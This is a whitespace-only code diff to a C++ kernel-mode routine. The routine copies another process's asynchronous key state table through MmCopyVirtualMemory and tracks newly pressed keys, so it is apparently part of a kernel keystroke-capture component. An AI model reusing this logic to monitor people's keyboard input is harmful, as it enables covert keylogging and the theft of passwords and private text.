@@ -364,10 +364,10 @@ BeUpdateKeyStateMap(
     _In_ CONST HANDLE& ProcId, 
     _In_ CONST PVOID&  GafAsyncKeyStateAddr
 ) {
-	memcpy(KeyPreviousStateMap, KeyStateMap, 64);
+    memcpy(KeyPreviousStateMap, KeyStateMap, 64);
 
-	SIZE_T Size = 0;
-	BeGlobals::pMmCopyVirtualMemory(
+    SIZE_T Size = 0;
+    BeGlobals::pMmCopyVirtualMemory(
         BeGetEprocessByPid(HandleToULong(ProcId)),
         GafAsyncKeyStateAddr,
         PsGetCurrentProcess(), 
@@ -375,18 +375,18 @@ BeUpdateKeyStateMap(
         sizeof(UINT8[64]),
         KernelMode,
         &Size
-	);
+    );
 
-	for (auto Vk = 0u; Vk < 256; ++Vk) 
-	{
+    for (auto Vk = 0u; Vk < 256; ++Vk) 
+    {
         //
         // If key is down but wasnt previously, set it in the recent state as down
         //
         if (IS_KEY_DOWN(KeyStateMap, Vk) && !(IS_KEY_DOWN(KeyPreviousStateMap, Vk)))
         {
-	        SET_KEY_DOWN(KeyRecentStateMap, Vk, TRUE);
+            SET_KEY_DOWN(KeyRecentStateMap, Vk, TRUE);
         }
-	}
+    }
 }
 
 /*
